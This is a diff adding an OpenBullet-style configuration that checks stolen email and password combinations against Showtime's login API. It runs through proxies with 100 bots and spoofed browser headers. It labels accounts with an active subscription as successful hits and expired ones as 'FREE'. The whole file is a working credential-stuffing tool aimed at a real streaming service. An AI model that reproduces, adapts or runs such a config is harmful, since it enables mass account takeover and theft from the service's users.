@@ -1,0 +1,43 @@
+[SETTINGS]
+{
+  "Name": "Showtime",
+  "SuggestedBots": 100,
+  "LastModified": "2018-11-08T09:59:15.7418122+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://secure.showtime.com/api/user/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-STAT-displayType: WEB" 
+  HEADER "X-STAT-contentVersion: OTT" 
+  HEADER "Referer: https://www.showtime.com/" 
+  HEADER "Origin: https://www.showtime.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "error" 
+    KEY "error.invalid.email.nonexisting.web" 
+  KEYCHAIN Success OR 
+    KEY "subscriptionStatus\":\"ACTIVE" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "subscriptionStatus\":\"EXPIRED" 
